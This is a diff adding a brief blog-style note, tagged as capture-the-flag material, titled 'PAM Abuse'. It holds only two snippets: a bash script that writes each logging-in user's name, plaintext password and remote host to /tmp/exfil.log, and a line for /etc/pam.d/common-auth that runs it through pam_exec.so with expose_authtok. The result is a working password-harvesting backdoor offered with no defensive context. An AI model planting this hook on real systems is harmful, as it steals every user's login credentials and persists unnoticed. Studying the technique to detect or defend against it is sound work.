@@ -1,0 +1,22 @@
+---
+title: "PAM Abuse"
+date: 2025-11-04 10:00:00 -0500
+categories: [linux, ctf]
+tags: [linux, ctf, pam, htb, auth]
+description: "CTF stuff"
+---
+
+
+## Script that will execute when user logs in via PAM
+
+```bash
+#!/bin/bash
+
+echo "$(date) $PAM_USER, $(cat -), Host: $PAM_RHOST" >> /tmp/exfil.log
+```
+
+## Entry to add in /etc/pam.d/common-auth
+
+```bash
+auth	optional	pam_exec.so	quiet	expose_authtok	/tmp/pwn.sh
+```
